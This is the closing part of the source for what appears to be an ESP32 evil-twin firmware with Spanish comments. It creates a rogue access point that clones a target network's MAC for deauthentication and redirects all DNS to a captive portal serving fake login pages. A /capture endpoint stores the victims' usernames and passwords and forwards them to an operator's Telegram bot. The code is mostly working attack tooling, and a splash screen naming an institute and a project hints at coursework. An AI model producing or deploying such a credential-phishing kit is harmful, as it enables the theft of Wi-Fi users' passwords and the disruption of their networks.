async function loadConfig(){try{const r=await fetch('/admin/config'),d=await r.json();document.getElementById('fake_ssid').value=d.fake_ssid||'';document.getElementById('fake_password').value=d.fake_password||'';document.getElementById('target_ssid').value=d.target_ssid||'';document.getElementById('target_bssid').value=d.target_bssid||'';document.getElementById('telegram_token').value=d.telegram_token||'';document.getElementById('telegram_chat_id').value=d.telegram_chat_id||'';document.getElementById('sta_ssid').value=d.sta_ssid||'';document.getElementById('sta_password').value=d.sta_password||'';document.getElementById('channel').value=d.channel||6;document.getElementById('deauth').value=d.deauth?'true':'false';document.getElementById('telegram_enabled').value=d.telegram_enabled?'true':'false';document.getElementById('template').value=d.template||0;}catch(e){console.error('Error loading config:',e)}}
async function loadStats(){try{const r=await fetch('/admin/stats'),d=await r.json();document.getElementById('statCaptures').textContent=d.total_captures||0;document.getElementById('statClients').textContent=d.clients||0;document.getElementById('statChannel').textContent=d.channel||'-';document.getElementById('statDeauth').textContent=d.deauth_active?'ON':'OFF';document.getElementById('statDeauth').style.color=d.deauth_active?'#34d399':'#f87171';document.getElementById('statSTA').textContent=d.sta_connected?'Conectado':'Sin conexion';document.getElementById('statSTA').style.color=d.sta_connected?'#34d399':'#f87171';document.getElementById('statQueue').textContent=d.queue_count||0;document.getElementById('statsTime').textContent='Ultima actualizacion: '+new Date().toLocaleTimeString()}catch(e){console.error('Error loading stats:',e)}}

// ============================================================
// OCULTAR TODOS LOS MENSAJES AL INICIO
// ============================================================
function hideAllMessages() {
    document.getElementById('successMsg').style.display = 'none';
    document.getElementById('errorMsg').style.display = 'none';
}

// ============================================================
// GUARDAR CONFIGURACIÓN - CON SESSIONSTORAGE
// ============================================================
document.getElementById('configForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    // Ocultar mensajes anteriores
    hideAllMessages();
    
    // Validar campos
    const fakeSsid = document.getElementById('fake_ssid').value.trim();
    if (fakeSsid.length === 0) {
        document.getElementById('errorMsg').textContent = 'El SSID no puede estar vacio';
        document.getElementById('errorMsg').style.display = 'block';
        setTimeout(() => { hideAllMessages(); }, 3000);
        return;
    }
    
    const channel = parseInt(document.getElementById('channel').value);
    if (isNaN(channel) || channel < 1 || channel > 11) {
        document.getElementById('errorMsg').textContent = 'Canal debe estar entre 1 y 11';
        document.getElementById('errorMsg').style.display = 'block';
        setTimeout(() => { hideAllMessages(); }, 3000);
        return;
    }
    
    const bssid = document.getElementById('target_bssid').value.trim();
    if (bssid.length > 0 && !/^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/.test(bssid)) {
        document.getElementById('errorMsg').textContent = 'Formato MAC invalido (ej: AA:BB:CC:DD:EE:FF)';
        document.getElementById('errorMsg').style.display = 'block';
        setTimeout(() => { hideAllMessages(); }, 3000);
        return;
    }
    
    const d = Object.fromEntries(new FormData(e.target));
    if(!d.fake_ssid)d.fake_ssid='';if(!d.fake_password)d.fake_password='';if(!d.target_ssid)d.target_ssid='';
    if(!d.target_bssid)d.target_bssid='';if(!d.telegram_token)d.telegram_token='';if(!d.telegram_chat_id)d.telegram_chat_id='';
    if(!d.sta_ssid)d.sta_ssid='';if(!d.sta_password)d.sta_password='';if(!d.channel)d.channel='6';
    if(!d.deauth)d.deauth='true';if(!d.telegram_enabled)d.telegram_enabled='true';if(!d.template)d.template='0';
    try {
        const r=await fetch('/admin/save',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json'},body:new URLSearchParams(d).toString()});
        const j=await r.json();
        if(j.success){
            // ✅ Guardar mensaje en sessionStorage y recargar
            sessionStorage.setItem('configSaved', 'true');
            window.location.reload();
        }else{
            document.getElementById('errorMsg').textContent = 'Error al guardar la configuracion';
            document.getElementById('errorMsg').style.display = 'block';
            setTimeout(() => { hideAllMessages(); }, 3000);
        }
    }catch(e){
        document.getElementById('errorMsg').textContent = 'Error de conexion: ' + e.message;
        document.getElementById('errorMsg').style.display = 'block';
        setTimeout(() => { hideAllMessages(); }, 3000);
    }
});

// ============================================================
// MOSTRAR MENSAJE DE SESSIONSTORAGE AL CARGAR LA PÁGINA
// ============================================================
window.addEventListener('DOMContentLoaded', function() {
    // Ocultar todos los mensajes primero
    hideAllMessages();
    
    // Verificar si hay un mensaje de éxito guardado
    if (sessionStorage.getItem('configSaved') === 'true') {
        document.getElementById('successMsg').style.display = 'block';
        sessionStorage.removeItem('configSaved');
        setTimeout(() => { hideAllMessages(); }, 3000);
    }
});

async function rebootESP32(){if(confirm('Reiniciar?')){await fetch('/admin/reboot');setTimeout(()=>alert('Reiniciando...'),500)}}
async function clearCredentials(){if(confirm('Borrar credenciales?')){await fetch('/admin/clear');alert('Borradas');loadStats()}}

// ============================================================
// ESCÁNER DE REDES
// ============================================================
async function scanNetworks() {
    const status=document.getElementById('scanStatus');
    const results=document.getElementById('scanResults');
    const time=document.getElementById('scanTime');
    status.textContent='● Escaneando...';
    status.style.color='#fbbf24';
    results.innerHTML='<div style="text-align:center;color:rgba(255,255,255,0.5);padding:20px;">Escaneando...</div>';
    try {
        const r=await fetch('/admin/scan'),d=await r.json();
        if(!d.networks||d.networks.length===0){
            results.innerHTML='<div style="text-align:center;color:rgba(255,255,255,0.3);padding:20px;">No se encontraron redes</div>';
            status.textContent='● Completado';status.style.color='#f87171';
            time.textContent='Ultimo escaneo: '+new Date().toLocaleTimeString();
            return;
        }
        let html='<table><thead><tr><th>#</th><th>SSID</th><th>MAC</th><th style="text-align:center;">CH</th><th style="text-align:center;">RSSI</th><th style="text-align:center;">Senal</th></tr></thead><tbody>';
        d.networks.sort((a,b)=>b.rssi-a.rssi);
        let count=0;
        for(const net of d.networks){
            if(net.isHidden)continue;
            count++;
            const rssiColor=net.rssi>-50?'#34d399':net.rssi>-70?'#fbbf24':'#f87171';
            const bars=net.rssi>-50?'||||':net.rssi>-60?'|||':net.rssi>-70?'||':'|';
            html+=`<tr><td style="color:rgba(255,255,255,0.3);">${count}</td><td style="color:#fff;">${net.ssid||'(Red oculta)'}</td><td style="color:rgba(255,255,255,0.3);font-family:monospace;font-size:10px;">${net.bssid}</td><td style="color:rgba(255,255,255,0.5);text-align:center;">${net.channel}</td><td style="color:${rssiColor};text-align:center;">${net.rssi} dBm</td><td style="text-align:center;">${bars}</td></tr>`;
        }
        html+='</tbody></table>';
        results.innerHTML=html;
        status.textContent='● '+count+' redes encontradas';
        status.style.color='#34d399';
        time.textContent='Ultimo escaneo: '+new Date().toLocaleTimeString();
    }catch(e){
        results.innerHTML='<div style="text-align:center;color:#f87171;padding:20px;">Error: '+e.message+'</div>';
        status.textContent='● Error';status.style.color='#f87171';
    }
}
function clearScanResults(){
    document.getElementById('scanResults').innerHTML='<div style="text-align:center;color:rgba(255,255,255,0.3);padding:20px;">Presiona "Escanear" para ver redes</div>';
    document.getElementById('scanStatus').textContent='● Listo';
    document.getElementById('scanStatus').style.color='#34d399';
    document.getElementById('scanTime').textContent='';
}

loadConfig();loadStats();setInterval(loadStats,5000);
</script>
</body>
</html>
)rawliteral";

// ============================================================================
// FUNCIONES SPIFFS
// ============================================================================
void initSPIFFS() {
    if (!SPIFFS.begin(true)) {
        Serial.println("[ERROR] SPIFFS");
        return;
    }
    Serial.println("[OK] SPIFFS");
}

void saveConfig() {
    StaticJsonDocument<1024> doc;
    doc["fake_ssid"] = fake_ssid;
    doc["fake_password"] = fake_password;
    doc["target_ssid"] = target_ssid;
    doc["target_bssid"] = target_bssid_str;
    doc["telegram_token"] = telegram_token;
    doc["telegram_chat_id"] = telegram_chat_id;
    doc["sta_ssid"] = sta_ssid;
    doc["sta_password"] = sta_password;
    doc["channel"] = operation_channel;
    doc["deauth"] = enable_deauth_attack;
    doc["telegram_enabled"] = enable_telegram;
    doc["template"] = selected_template;
    
    File file = SPIFFS.open(config_file, FILE_WRITE);
    if (file) {
        serializeJson(doc, file);
        file.close();
    }
}

void loadConfig() {
    if (!SPIFFS.exists(config_file)) {
        saveConfig();
        return;
    }
    
    File file = SPIFFS.open(config_file, FILE_READ);
    if (!file) return;
    
    StaticJsonDocument<1024> doc;
    DeserializationError error = deserializeJson(doc, file);
    file.close();
    
    if (error) return;
    
    fake_ssid = doc["fake_ssid"].as<String>();
    fake_password = doc["fake_password"].as<String>();
    target_ssid = doc["target_ssid"].as<String>();
    target_bssid_str = doc["target_bssid"].as<String>();
    telegram_token = doc["telegram_token"].as<String>();
    telegram_chat_id = doc["telegram_chat_id"].as<String>();
    sta_ssid = doc["sta_ssid"].as<String>();
    sta_password = doc["sta_password"].as<String>();
    operation_channel = doc["channel"] | DEFAULT_CHANNEL;
    enable_deauth_attack = doc["deauth"] | true;
    enable_telegram = doc["telegram_enabled"] | true;
    selected_template = doc["template"] | TEMPLATE_MIKROTIK;
    
    parseBSSID(target_bssid_str, target_bssid);
    current_channel = operation_channel;
}

// ============================================================================
// FUNCIONES DE CREDENCIALES
// ============================================================================
void saveCredential(String username, String password) {
    File file = SPIFFS.open(creds_file, FILE_APPEND);
    if (!file) return;
    
    unsigned long timestamp = millis() / 1000;
    file.println("[" + String(timestamp) + "] " + username + " | " + password);
    file.close();
    totalCaptures++;
    
    pendingQueue.push(username, password);
    
    Serial.printf("[CAPTURA] %s : %s\n", username.c_str(), password.c_str());
    showCredentialOnOLED(username, password);
}

// ============================================================================
// FUNCIONES OLED
// ============================================================================
void displaySplashScreen() {
    u8g2.clearBuffer();
    u8g2.drawFrame(0, 0, 128, 64);
    u8g2.drawLine(0, 12, 128, 12);
    u8g2.drawLine(0, 52, 128, 52);
    
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.setCursor(5, 10);
    u8g2.print(INSTITUTO);
    
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.setCursor(5, 28);
    u8g2.print(PROYECTO);
    
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.setCursor(5, 43);
    u8g2.print("Autor: ");
    u8g2.print(AUTOR);
    
    u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.setCursor(5, 60);
    u8g2.print("SSID: ");
    u8g2.print(fake_ssid.substring(0, 12));
    
    u8g2.setCursor(70, 60);
    u8g2.print("Ch:");
    u8g2.print(operation_channel);
    
    u8g2.sendBuffer();
}

void displayStats() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    
    u8g2.drawFrame(0, 0, 128, 64);
    u8g2.drawLine(0, 12, 128, 12);
    
    u8g2.setCursor(25, 10);
    u8g2.print("ESTADISTICAS");
    
    u8g2.setCursor(5, 24);
    u8g2.print("Clientes:");
    u8g2.setCursor(85, 24);
    u8g2.print(WiFi.softAPgetStationNum());
    
    u8g2.setCursor(5, 34);
    u8g2.print("Capturas:");
    u8g2.setCursor(85, 34);
    u8g2.print(totalCaptures);
    
    u8g2.setCursor(5, 44);
    u8g2.print("Canal:");
    u8g2.setCursor(60, 44);
    u8g2.print(current_channel);
    
    u8g2.setCursor(5, 54);
    u8g2.print("Deauth:");
    u8g2.setCursor(60, 54);
    u8g2.print(enable_deauth_attack ? "ON" : "OFF");
    
    u8g2.setCursor(5, 62);
    u8g2.print("STA:");
    u8g2.setCursor(30, 62);
    u8g2.print(staConnected ? "OK" : "NO");
    
    u8g2.setCursor(60, 62);
    u8g2.print("Cola:");
    u8g2.setCursor(85, 62);
    u8g2.print(pendingQueue.size());
    
    u8g2.sendBuffer();
}

void displayCredentials() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    
    u8g2.drawFrame(0, 0, 128, 64);
    u8g2.drawLine(0, 12, 128, 12);
    
    u8g2.setCursor(10, 10);
    u8g2.print("CREDENCIALES");
    
    if (totalCaptures == 0) {
        u8g2.setCursor(25, 35);
        u8g2.print("No hay capturas");
        u8g2.sendBuffer();
        return;
    }
    
    File file = SPIFFS.open(creds_file, FILE_READ);
    if (!file) {
        u8g2.setCursor(10, 35);
        u8g2.print("Error al leer");
        u8g2.sendBuffer();
        return;
    }
    
    String lines[4];
    int lineCount = 0;
    while (file.available()) {
        String line = file.readStringUntil('\n');
        if (!line.startsWith("#") && line.length() > 0) {
            for (int i = 3; i > 0; i--) { lines[i] = lines[i-1]; }
            lines[0] = line;
            if (lineCount < 4) lineCount++;
        }
    }
    file.close();
    
    int yPos = 24;
    for (int i = lineCount - 1; i >= 0 && i < 4; i--) {
        String displayLine = lines[i];
        if (displayLine.length() > 20) displayLine = displayLine.substring(0, 18) + "..";
        u8g2.setCursor(5, yPos);
        u8g2.print(displayLine);
        yPos += 10;
    }
    
    u8g2.sendBuffer();
}

void displayCapturedCredential(String username, String password) {
    u8g2.clearBuffer();
    u8g2.drawFrame(0, 0, 128, 64);
    u8g2.drawLine(0, 12, 128, 12);
    
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.setCursor(10, 10);
    u8g2.print("NUEVA CAPTURA!");
    
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.setCursor(5, 28);
    u8g2.print("User: ");
    u8g2.print(username.substring(0, 14));
    
    u8g2.setCursor(5, 44);
    u8g2.print("Pass: ");
    u8g2.print(password.substring(0, 14));
    
    u8g2.setFont(u8g2_font_5x7_tf);
    u8g2.setCursor(5, 60);
    u8g2.print("Total: ");
    u8g2.print(totalCaptures);
    
    u8g2.sendBuffer();
}

void displaySystemStatus() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    
    u8g2.drawFrame(0, 0, 128, 64);
    u8g2.drawLine(0, 12, 128, 12);
    
    u8g2.setCursor(15, 10);
    u8g2.print("SISTEMA");
    
    u8g2.setCursor(5, 24);
    u8g2.print("AP:");
    u8g2.setCursor(30, 24);
    u8g2.print(fake_ssid.substring(0, 14));
    
    u8g2.setCursor(5, 34);
    u8g2.print("Obj:");
    u8g2.setCursor(30, 34);
    u8g2.print(target_ssid.substring(0, 14));
    
    u8g2.setCursor(5, 44);
    u8g2.print("Telegram:");
    u8g2.setCursor(85, 44);
    u8g2.print(enable_telegram ? "ON" : "OFF");
    
    u8g2.setCursor(5, 54);
    u8g2.print("Cola:");
    u8g2.setCursor(60, 54);
    u8g2.print(pendingQueue.size());
    
    u8g2.setCursor(5, 62);
    u8g2.print("IP:");
    u8g2.setCursor(30, 62);
    u8g2.print("8.8.8.8");
    
    u8g2.sendBuffer();
}

void updateDisplay() {
    if (credentialDisplayActive) {
        if (millis() - credentialDisplayTime > CREDENTIAL_DISPLAY_DURATION) {
            credentialDisplayActive = false;
            displayPaused = false;
            autoRotationEnabled = true;
            lastPageChange = millis();
            displayPage = 1;
        } else {
            displayCapturedCredential(lastCredentialUser, lastCredentialPass);
            return;
        }
    }
    switch (displayPage) {
        case 0: displaySplashScreen(); break;
        case 1: displayStats(); break;
        case 2: displayCredentials(); break;
        case 3: displaySystemStatus(); break;
        default: displaySplashScreen(); break;
    }
}

void setDisplayPage(int page) {
    if (page >= 0 && page <= 3) {
        displayPage = page;
        credentialDisplayActive = false;
        updateDisplay();
    }
}

void showCredentialOnOLED(String username, String password) {
    lastCredentialUser = username;
    lastCredentialPass = password;
    credentialDisplayActive = true;
    credentialDisplayTime = millis();
    displayPaused = true;
    autoRotationEnabled = false;
    updateDisplay();
}

// ============================================================================
// FUNCIONES DE TELEGRAM
// ============================================================================
void connectSTA() {
    if (WiFi.status() == WL_CONNECTED) {
        staConnected = true;
        return;
    }
    
    Serial.print("[STA] Conectando...");
    WiFi.begin(sta_ssid.c_str(), sta_password.c_str());
    
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 30) {
        delay(500);
        Serial.print(".");
        attempts++;
    }
    
    if (WiFi.status() == WL_CONNECTED) {
        Serial.println(" OK");
        staConnected = true;
    } else {
        Serial.println(" ERROR");
        staConnected = false;
    }
    updateDisplay();
}

void sendToTelegram(String username, String password) {
    if (!enable_telegram || !staConnected) return;
    
    HTTPClient http;
    String url = "https://api.telegram.org/bot" + telegram_token + "/sendMessage";
    http.begin(url);
    http.addHeader("Content-Type", "application/x-www-form-urlencoded");
    
    String message = "NUEVA CAPTURA\n\n";
    message += "Usuario: " + username + "\n";
    message += "Password: " + password + "\n";
    message += "Total: " + String(totalCaptures);
    
    String postData = "chat_id=" + telegram_chat_id + "&text=" + urlEncode(message);
    
    int httpCode = http.POST(postData);
    if (httpCode == 200) {
        Serial.println("[TELEGRAM] OK");
    }
    http.end();
}

// ============================================================================
// CONFIGURACIÓN DEL ROGUE AP
// ============================================================================
void setupRogueAP() {
    WiFi.mode(WIFI_AP_STA);
    
    int channelToUse = operation_channel;
    if (channelToUse == 0) channelToUse = 6;
    
    esp_wifi_set_channel(channelToUse, WIFI_SECOND_CHAN_NONE);
    current_channel = channelToUse;
    
    const char* pass = (fake_password.length() > 0) ? fake_password.c_str() : NULL;
    WiFi.softAP(fake_ssid.c_str(), pass, channelToUse, 0, 4);
    WiFi.softAPConfig(ap_ip, gateway, subnet);
    
    if (enable_deauth_attack) {
        esp_wifi_set_mac(WIFI_IF_AP, target_bssid.data());
    }
    
    dnsServer.start(DNS_PORT, "*", ap_ip);
}

// ============================================================================
// ATAQUE DE DESAUTENTICACIÓN
// ============================================================================
void setupDeauthAttack() {
    if (!enable_deauth_attack) return;
    esp_wifi_set_mac(WIFI_IF_AP, target_bssid.data());
    if (current_channel > 0) {
        esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
    }
}

// ============================================================================
// SERVIDOR WEB
// ============================================================================
void setupWebServers() {
    server.on("/", [](AsyncWebServerRequest *request) {
        String html = getTemplateHTML(selected_template);
        request->send(200, "text/html", html);
    });
    
    server.on("/capture", HTTP_POST, [](AsyncWebServerRequest *request) {
        String user = request->arg("username");
        String pass = request->arg("password");
        if (user.length() && pass.length()) {
            saveCredential(user, pass);
            sendToTelegram(user, pass);
            request->send_P(200, "text/html", error_html);
        } else {
            request->send(400, "text/html", "Error");
        }
    });
    
    server.onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("/");
    });
    server.begin();
    
    adminServer.on("/", [](AsyncWebServerRequest *request) {
        if (!request->authenticate(ADMIN_USERNAME, ADMIN_PASSWORD)) {
            return request->requestAuthentication();
        }
        request->send_P(200, "text/html", admin_html);
    });
    
    adminServer.on("/admin/config", [](AsyncWebServerRequest *request) {
        if (!request->authenticate(ADMIN_USERNAME, ADMIN_PASSWORD)) return;
        
        StaticJsonDocument<512> doc;
        doc["fake_ssid"] = fake_ssid;
        doc["fake_password"] = fake_password;
        doc["target_ssid"] = target_ssid;
        doc["target_bssid"] = target_bssid_str;
        doc["telegram_token"] = telegram_token;
        doc["telegram_chat_id"] = telegram_chat_id;
        doc["sta_ssid"] = sta_ssid;
        doc["sta_password"] = sta_password;
        doc["channel"] = operation_channel;
        doc["deauth"] = enable_deauth_attack;
        doc["telegram_enabled"] = enable_telegram;
        doc["template"] = selected_template;
        
        String response;
        serializeJson(doc, response);
        request->send(200, "application/json", response);
    });
    
    adminServer.on("/admin/save", HTTP_POST, [](AsyncWebServerRequest *request) {
        if (!request->authenticate(ADMIN_USERNAME, ADMIN_PASSWORD)) {
            request->send(401, "application/json", "{\"success\":false,\"error\":\"Unauthorized\"}");
            return;
        }
        
        if (request->hasParam("fake_ssid", true)) {
            fake_ssid = request->getParam("fake_ssid", true)->value();
        }
        if (request->hasParam("fake_password", true)) {
            fake_password = request->getParam("fake_password", true)->value();
        }
        if (request->hasParam("target_ssid", true)) {
            target_ssid = request->getParam("target_ssid", true)->value();
        }
        if (request->hasParam("target_bssid", true)) {
            target_bssid_str = request->getParam("target_bssid", true)->value();
            parseBSSID(target_bssid_str, target_bssid);
        }
        if (request->hasParam("telegram_token", true)) {
            telegram_token = request->getParam("telegram_token", true)->value();
        }
        if (request->hasParam("telegram_chat_id", true)) {
            telegram_chat_id = request->getParam("telegram_chat_id", true)->value();
        }
        if (request->hasParam("sta_ssid", true)) {
            sta_ssid = request->getParam("sta_ssid", true)->value();
        }
        if (request->hasParam("sta_password", true)) {
            sta_password = request->getParam("sta_password", true)->value();
        }
        if (request->hasParam("channel", true)) {
            operation_channel = request->getParam("channel", true)->value().toInt();
        }
        if (request->hasParam("deauth", true)) {
            enable_deauth_attack = request->getParam("deauth", true)->value() == "true";
        }
        if (request->hasParam("telegram_enabled", true)) {
            enable_telegram = request->getParam("telegram_enabled", true)->value() == "true";
        }
        if (request->hasParam("template", true)) {
            int new_template = request->getParam("template", true)->value().toInt();
            if (new_template >= 0 && new_template <= 4) {
                selected_template = new_template;
            }
        }
        
        current_channel = operation_channel;
        saveConfig();
        
        request->send(200, "application/json", "{\"success\":true}");
        setupRogueAP();
    });
    
    adminServer.on("/admin/stats", [](AsyncWebServerRequest *request) {
        if (!request->authenticate(ADMIN_USERNAME, ADMIN_PASSWORD)) return;
        
        StaticJsonDocument<256> doc;
        doc["total_captures"] = totalCaptures;
        doc["clients"] = WiFi.softAPgetStationNum();
        doc["sta_connected"] = staConnected;
        doc["queue_count"] = pendingQueue.size();
        doc["deauth_active"] = enable_deauth_attack;
        doc["channel"] = operation_channel;
        doc["fake_ssid"] = fake_ssid;
        
        String response;
        serializeJson(doc, response);
        request->send(200, "application/json", response);
    });
    
    adminServer.on("/admin/clear", [](AsyncWebServerRequest *request) {
        if (!request->authenticate(ADMIN_USERNAME, ADMIN_PASSWORD)) return;
        SPIFFS.remove(creds_file);
        totalCaptures = 0;
        pendingQueue.clear();
        request->send(200, "application/json", "{\"success\":true}");
    });
    
    adminServer.on("/admin/reboot", [](AsyncWebServerRequest *request) {
        if (!request->authenticate(ADMIN_USERNAME, ADMIN_PASSWORD)) return;
        request->send(200, "application/json", "{\"success\":true}");
        delay(500);
        ESP.restart();
    });
    
    adminServer.on("/admin/scan", [](AsyncWebServerRequest *request) {
        if (!request->authenticate(ADMIN_USERNAME, ADMIN_PASSWORD)) {
            request->send(401, "application/json", "{\"success\":false,\"error\":\"Unauthorized\"}");
            return;
        }
        
        int n = WiFi.scanNetworks();
        
        if (n == 0) {
            request->send(200, "application/json", "{\"networks\":[]}");
            return;
        }
        
        StaticJsonDocument<8192> doc;
        JsonArray networks = doc.createNestedArray("networks");
        
        for (int i = 0; i < n; i++) {
            JsonObject net = networks.createNestedObject();
            net["ssid"] = WiFi.SSID(i);
            net["bssid"] = WiFi.BSSIDstr(i);
            net["channel"] = WiFi.channel(i);
            net["rssi"] = WiFi.RSSI(i);
            net["encryption"] = WiFi.encryptionType(i);
            net["isHidden"] = (WiFi.SSID(i).length() == 0);
        }
        
        String response;
        serializeJson(doc, response);
        WiFi.scanDelete();
        request->send(200, "application/json", response);
    });
    
    adminServer.begin();
}

// ============================================================================
// COMANDOS POR SERIAL
// ============================================================================
void handleSerialCommands() {
    if (!Serial.available()) return;
    
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    cmd.toLowerCase();
    
    if (cmd == "help") {
        Serial.println("\nCOMANDOS: stats | list | scan | channel | deauth on/off | clear | showconfig | oled 0-3");
    }
    else if (cmd == "stats") {
        Serial.printf("\nClientes:%d | Capturas:%d | Canal:%d | Deauth:%s | STA:%s | Cola:%d\n",
                      WiFi.softAPgetStationNum(), totalCaptures, current_channel,
                      enable_deauth_attack ? "ON" : "OFF",
                      staConnected ? "OK" : "NO",
                      pendingQueue.size());
    }
    else if (cmd == "list") {
        if (!SPIFFS.exists(creds_file)) {
            Serial.println("No hay credenciales");
            return;
        }
        File file = SPIFFS.open(creds_file, FILE_READ);
        while (file.available()) {
            Serial.println(file.readStringUntil('\n'));
        }
        file.close();
    }
    else if (cmd == "scan") {
        int n = WiFi.scanNetworks();
        for (int i = 0; i < n; i++) {
            Serial.printf("%d: %s | MAC: %s | Ch: %d\n",
                          i+1, WiFi.SSID(i).c_str(),
                          WiFi.BSSIDstr(i).c_str(),
                          WiFi.channel(i));
        }
        WiFi.scanDelete();
    }
    else if (cmd == "channel") {
        Serial.printf("Canal: %d\n", current_channel);
    }
    else if (cmd == "deauth on") {
        enable_deauth_attack = true;
        setupDeauthAttack();
        updateDisplay();
        Serial.println("Deauth ON");
    }
    else if (cmd == "deauth off") {
        enable_deauth_attack = false;
        updateDisplay();
        Serial.println("Deauth OFF");
    }
    else if (cmd == "clear") {
        if (SPIFFS.remove(creds_file)) {
            totalCaptures = 0;
            pendingQueue.clear();
            updateDisplay();
            Serial.println("Credenciales borradas");
        }
    }
    else if (cmd == "showconfig") {
        Serial.printf("\nSSID: %s | Canal: %d | Portal: %s | Deauth: %s\n",
                      fake_ssid.c_str(), operation_channel,
                      template_names[selected_template],
                      enable_deauth_attack ? "ON" : "OFF");
    }
    else if (cmd.startsWith("oled")) {
        int page = cmd.substring(4).toInt();
        if (page >= 0 && page <= 3) {
            displayPaused = true;
            autoResumeTimer = millis();
            setDisplayPage(page);
        }
    }
}

// ============================================================================
// SETUP
// ============================================================================
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Wire.begin(21, 22);
    u8g2.begin();
    u8g2.setContrast(150);
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.drawStr(20, 30, "Iniciando...");
    u8g2.sendBuffer();
    
    pinMode(BTN_OLED, INPUT_PULLUP);
    
    Serial.println("\n[INICIO] ESP32 Captive Portal v15.1");
    Serial.println("[INFO] Mensajes corregidos con sessionStorage");
    
    initSPIFFS();
    loadConfig();
    connectSTA();
    setupRogueAP();
    setupDeauthAttack();
    setupWebServers();
    
    displayPage = 0;
    lastPageChange = millis();
    updateDisplay();
    
    Serial.printf("[INICIO] AP: %s | IP: 8.8.8.8 | Canal: %d | Portal: %s\n",
                  fake_ssid.c_str(), operation_channel,
                  template_names[selected_template]);
    Serial.printf("[INICIO] Admin: http://8.8.8.8:81 (admin/admin123)\n");
    Serial.printf("[INICIO] Cola segura: %d slots\n", MAX_QUEUE_SIZE);
    Serial.println("[INFO] Listo");
}

// ============================================================================
// LOOP
// ============================================================================
unsigned long lastReconnectAttempt = 0;
unsigned long lastStatusLog = 0;

void loop() {
    dnsServer.processNextRequest();
    handleSerialCommands();
    
    if (!staConnected && (millis() - lastReconnectAttempt > 60000)) {
        lastReconnectAttempt = millis();
        connectSTA();
    }
    
    if (digitalRead(BTN_OLED) == LOW && (millis() - lastButtonPress > BUTTON_DEBOUNCE)) {
        lastButtonPress = millis();
        if (credentialDisplayActive) {
            credentialDisplayActive = false;
            displayPaused = false;
            autoRotationEnabled = true;
            lastPageChange = millis();
            displayPage = 1;
            updateDisplay();
        } else {
            displayPage = (displayPage + 1) % 4;
            displayPaused = true;
            autoResumeTimer = millis();
            updateDisplay();
        }
    }
    
    if (displayPaused && (millis() - autoResumeTimer > AUTO_RESUME_DELAY) && !credentialDisplayActive) {
        displayPaused = false;
        autoRotationEnabled = true;
        lastPageChange = millis();
    }
    
    if (credentialDisplayActive && (millis() - credentialDisplayTime > CREDENTIAL_DISPLAY_DURATION)) {
        credentialDisplayActive = false;
        displayPaused = false;
        autoRotationEnabled = true;
        lastPageChange = millis();
        displayPage = 1;
        updateDisplay();
    }
    
    if (autoRotationEnabled && !displayPaused && !credentialDisplayActive &&
        (millis() - lastPageChange > pageRotationInterval)) {
        lastPageChange = millis();
        displayPage = (displayPage + 1) % 4;
        updateDisplay();
    }
    
    if (millis() - lastDisplayUpdate > DISPLAY_UPDATE_INTERVAL) {
        lastDisplayUpdate = millis();
        if (displayPage == 1 || displayPage == 3) {
            updateDisplay();
        }
    }
    
    if (millis() - lastStatusLog > 60000) {
        lastStatusLog = millis();
        int clients = WiFi.softAPgetStationNum();
        if (clients > 0 || totalCaptures > 0 || pendingQueue.size() > 0) {
            Serial.printf("[STATS] Clientes:%d | Capturas:%d | Cola:%d\n",
                          clients, totalCaptures, pendingQueue.size());
        }
    }
    
    delay(10);
}
